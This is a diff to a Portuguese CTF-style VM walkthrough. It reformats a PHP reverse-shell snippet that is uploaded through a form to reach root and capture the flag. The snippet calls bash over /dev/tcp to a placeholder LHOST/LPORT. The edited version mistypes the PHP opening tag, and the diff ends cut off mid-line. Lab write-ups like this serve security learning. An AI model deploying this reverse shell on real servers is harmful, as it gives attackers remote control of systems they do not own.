@@ -90,12 +90,11 @@ Agora precisamos criar a reverse shell para enviar usando esse formulário.
 
 Vamos usar uma shell simples que utiliza a função [exec()](https://www.php.net/manual/en/function.exec.php) do php.
 
-><?php
+```php
+<php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'");
 >
->exec("/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'");
->
->?>
-
+```
 
 Vamos então abrir o formulário que criamos e fazer o upload da reverse shell no servidor alvo.
 
@@ -178,4 +177,4 @@ Podemos ver que temos acesso root.
 
 E dentro do diretório /root, temos a flag da VM.
 
-<imr src ="/img/desafio2/vm7/hardy 22.png">
+<imr src ="/img/desafi?
